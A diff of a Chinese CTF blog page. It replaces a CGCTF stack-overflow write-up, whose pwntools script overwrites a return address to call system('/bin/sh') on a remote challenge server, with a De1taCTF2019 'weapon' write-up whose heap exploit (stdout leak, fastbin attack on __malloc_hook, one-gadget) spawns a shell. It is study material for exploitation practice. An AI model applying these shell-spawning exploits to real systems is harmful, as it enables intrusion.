@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="题目地址 拖进ida，有system函数无/bin/sh字符串，主函数里如果choice!=1就不会进入message函数，所以第一个输入就sendline(‘1’)就行了 message函数： 12345678char s; // [esp+18h] [ebp-30h]n = 10;puts(&amp;quot;you can leave some message here:&amp;quot;);fgets(">
+<meta name="description" content="届到了.jpg">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CGCTF-stackoverflow">
-<meta property="og:url" content="http://yoursite.com/2018/10/03/cgctf-stackoverflow/index.html">
+<meta property="og:title" content="De1taCTF2019-weapon">
+<meta property="og:url" content="http://yoursite.com/2019/09/11/De1taCTF2019-weapon/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="题目地址 拖进ida，有system函数无/bin/sh字符串，主函数里如果choice!=1就不会进入message函数，所以第一个输入就sendline(‘1’)就行了 message函数： 12345678char s; // [esp+18h] [ebp-30h]n = 10;puts(&amp;quot;you can leave some message here:&amp;quot;);fgets(">
+<meta property="og:description" content="届到了.jpg">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-05T15:36:34.483Z">
+<meta property="og:updated_time" content="2019-09-11T14:09:51.296Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CGCTF-stackoverflow">
-<meta name="twitter:description" content="题目地址 拖进ida，有system函数无/bin/sh字符串，主函数里如果choice!=1就不会进入message函数，所以第一个输入就sendline(‘1’)就行了 message函数： 12345678char s; // [esp+18h] [ebp-30h]n = 10;puts(&amp;quot;you can leave some message here:&amp;quot;);fgets(">
+<meta name="twitter:title" content="De1taCTF2019-weapon">
+<meta name="twitter:description" content="届到了.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>CGCTF-stackoverflow | 4eriri&#39;s blog</title>
+<title>De1taCTF2019-weapon | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -196,11 +196,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-cgctf-stackoverflow" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-De1taCTF2019-weapon" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/10/03/cgctf-stackoverflow/" class="article-date">
-      <time datetime="2018-10-03T11:34:16.000Z" itemprop="datePublished">2018-10-03</time>
+      <a href="/2019/09/11/De1taCTF2019-weapon/" class="article-date">
+      <time datetime="2019-09-11T14:03:27.000Z" itemprop="datePublished">2019-09-11</time>
 </a>
 
 
@@ -215,7 +215,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      CGCTF-stackoverflow
+      De1taCTF2019-weapon
     </h1>
   
 
@@ -232,15 +232,13 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><a href="https://cgctf.nuptsast.com/challenges#Pwn" target="_blank" rel="noopener">题目地址</a></p>
-<p>拖进ida，有system函数无/bin/sh字符串，主函数里如果choice!=1就不会进入message函数，所以第一个输入就sendline(‘1’)就行了</p>
-<p>message函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char s; // [esp+18h] [ebp-30h]</span><br><span class="line"></span><br><span class="line">n = 10;</span><br><span class="line">puts(&quot;you can leave some message here:&quot;);</span><br><span class="line">fgets(A, 60, stdin);</span><br><span class="line">puts(&quot;your name please:&quot;);</span><br><span class="line">fgets(&amp;s, n, stdin);</span><br><span class="line">return puts(&quot;Thank you&quot;);</span><br></pre></td></tr></table></figure>
-<p>a可以用来存放/bin/sh字符串，n的地址就在a后面，而a的大小只有40，所以输入超过40的话就可以改变n的值，让s(大小为0x30)产生栈溢出，最终覆盖掉message函数的返回地址，进入system函数。</p>
-<p>脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&apos;182.254.217.142&apos;,10001)</span><br><span class="line">sh.recvuntil(&apos;your choice:&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;you can leave some message here:&apos;)</span><br><span class="line">payload=&apos;/bin/sh\0&apos;+&apos;a&apos;*40</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&apos;your name please:&apos;)</span><br><span class="line">payload=&apos;a&apos;*0x30+&apos;a&apos;*4+p32(0x80483f0)+&apos;a&apos;*4+p32(0x0804a080)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>随后按照题目提示进入目录cat flag即可</p>
-
+        <p>届到了.jpg</p>
+<a id="more"></a>
+<p>虽然还是一知半解，但是至少知道了利用stdout leak的方法，掌握了一种无输出函数的leak方法。</p>
+<p>同时还学到了利用scanf读入大量字符时，会申请一个0x400堆块，把已有的fastbin置入smallbin的操作，这样就可以在限制了分配大小的情况下leaklibc了。</p>
+<p>leaklibc    -&gt;    fastbin attack    -&gt;    get shell</p>
+<p>EXP （不知道为啥leak之后输出就变的和包函数时不一样了只能手动写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *from LibcSearcher import *#context.log_level=&apos;debug&apos;onegadget=[0x45216,0x4526a,0xf02a4,0xf1147] #libc.so.6def create(size,idx,content):	sh.recvuntil(&quot;choice &gt;&gt; &quot;)	sh.sendline(&quot;1&quot;)	sh.recvuntil(&quot;weapon: &quot;)	sh.sendline(str(int(size)))	sh.recvuntil(&quot;index: &quot;)	sh.sendline(str(idx))	sh.recvuntil(&quot;input your name:\n&quot;)	sh.send(content)def rename(idx,content):	sh.recvuntil(&quot;choice &gt;&gt; &quot;)	sh.sendline(&quot;3&quot;)	sh.recvuntil(&quot;idx: &quot;)	sh.sendline(str(int(idx)))	sh.recvuntil(&quot;content:\n&quot;)	sh.send(content)def delete(idx):	sh.recvuntil(&quot;choice &gt;&gt; &quot;)	sh.sendline(&quot;2&quot;)	sh.recvuntil(&quot;idx :&quot;)		sh.sendline(str(idx))libc=ELF(&apos;./pwn&apos;).libcwhile True:	sh=process(&apos;./pwn&apos;)	create(0x60,0,&quot;a&quot;)	create(0x60,1,&quot;a&quot;)	create(0x60,2,&quot;a&quot;)	delete(0)	delete(1)	sh.recvuntil(&quot;choice &gt;&gt; &quot;)	sh.sendline(&quot;1&quot;*0x400)	create(0x60,3,&quot;\xdd\x25&quot;)	create(0x60,4,&apos;d&apos;)	delete(2)	delete(1)	rename(1,&apos;\x00&apos;)	create(0x60,5,&apos;a&apos;)	create(0x60,6,&apos;a&apos;)	try:		create(0x60,7,&apos;\x00&apos;*0x33+p64(0xfbad1800)+p64(0)*3+&apos;\x08&apos;)			except EOFError:		sh.close()		continue	 		else:		sh.recvuntil(p64(0xfbad1800)+&apos;\x00&apos;*24)		leak=u64(sh.recv(6)+&apos;\x00\x00&apos;)		mallochook=0x7f20568e1b10+leak-0x7f20568e2608		log.success(&quot;malloc_hook: &quot;+hex(mallochook))		libcbase=mallochook-libc.symbols[&apos;__malloc_hook&apos;]		log.success(&quot;libcbase: &quot;+hex(libcbase))		sh.recvuntil(&quot;choice &gt;&gt; &quot;)		sh.sendline(&quot;1&quot;)		sh.recvuntil(&quot;weapon: &quot;)		sh.sendline(str(int(0x60)))		sh.recvuntil(&quot;index: &quot;)		sh.sendline(str(7))		sh.recvuntil(&quot;input your name:&quot;)		sh.send(&quot;content&quot;)		delete(7)		sh.recvuntil(&quot;choice &gt;&gt; &quot;)		sh.sendline(&quot;3&quot;)		sh.recvuntil(&quot;idx: &quot;)		sh.sendline(str(int(7)))		sh.recvuntil(&quot;content:&quot;)		sh.send(p64(mallochook-0x23))		sh.recvuntil(&quot;choice &gt;&gt; &quot;)		sh.sendline(&quot;1&quot;)		sh.recvuntil(&quot;weapon: &quot;)		sh.sendline(str(int(0x60)))		sh.recvuntil(&quot;index: &quot;)		sh.sendline(str(8))		sh.recvuntil(&quot;input your name:&quot;)		sh.send(&quot;content&quot;)		sh.recvuntil(&quot;choice &gt;&gt; &quot;)		sh.sendline(&quot;1&quot;)		sh.recvuntil(&quot;weapon: &quot;)		sh.sendline(str(int(0x60)))		sh.recvuntil(&quot;index: &quot;)		sh.sendline(str(9))		sh.recvuntil(&quot;input your name:&quot;)		sh.send(&apos;\x00&apos;*19+p64(libcbase+onegadget[3]))		delete(0)		delete(0)		sh.interactive()		break</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -248,13 +246,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/10/03/cgctf-stackoverflow/">CGCTF-stackoverflow</a></p>
+        <p><span>本文标题:</span><a href="/2019/09/11/De1taCTF2019-weapon/">De1taCTF2019-weapon</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2018-10-03, 19:34:16</p>
-        <p><span>最后更新:</span>2019-03-05, 23:36:34</p>
+        <p><span>发布时间:</span>2019-09-11, 22:03:27</p>
+        <p><span>最后更新:</span>2019-09-11, 22:09:51</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/10/03/cgctf-stackoverflow/" title="CGCTF-stackoverflow">http://yoursite.com/2018/10/03/cgctf-stackoverflow/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/03/cgctf-stackoverflow/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/09/11/De1taCTF2019-weapon/" title="De1taCTF2019-weapon">http://yoursite.com/2019/09/11/De1taCTF2019-weapon/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/09/11/De1taCTF2019-weapon/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -266,16 +264,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/10/08/bugku-re-1/">
-                    bugku-re-1
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/10/03/十一欢乐赛-pwn4/">
-                    十一欢乐赛-pwn4
+                <a href="/2019/09/09/BYTECTF2019-mulnote/">
+                    BYTECTF2019-mulnote
                 </a>
             </div>
         
@@ -323,7 +315,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"CGCTF-stackoverflow　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"De1taCTF2019-weapon　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -342,8 +334,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2018/10/03/cgctf-stackoverflow/';
-            this.page.identifier = '2018/10/03/cgctf-stackoverflow/';
+            this.page.url = 'http://yoursite.com/2019/09/11/De1taCTF2019-weapon/';
+            this.page.identifier = '2019/09/11/De1taCTF2019-weapon/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -365,15 +357,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/10/08/bugku-re-1/" title="上一篇: bugku-re-1">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/10/03/十一欢乐赛-pwn4/" title="下一篇: 十一欢乐赛-pwn4">
+            <a href="/2019/09/09/BYTECTF2019-mulnote/" title="下一篇: BYTECTF2019-mulnote">
                 <i class="fa fa-angle-right"></i>
             </a>
         
